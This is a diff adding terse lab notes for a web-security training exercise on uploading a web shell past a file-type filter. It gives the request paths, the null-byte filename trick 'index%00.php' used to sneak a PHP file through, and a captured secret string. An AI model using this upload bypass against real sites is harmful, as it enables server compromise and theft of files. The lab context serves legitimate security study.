@@ -1,0 +1,23 @@
+Lab #5: Web shell upload via obfuscated file extension
+
+End goal: Find the content in /home/carlos/secret
+
+Analysis:
+
+1. Get images path traversal
+
+GET /files/avatars/images.jpeg
+
+2. Upload php file
+
+--> Sorry, only JPG & PNG files are allowed Sorry, there was an error uploading your file.
+
+Go to POST /my-account/avatar 
+    filename="index%00.php"
+
+3. Find the content
+
+Go to (1):
+GET /files/avatars/index.php
+
+NLHSpq3ORIlFA2KXgvb7W02xel4EmAqJ
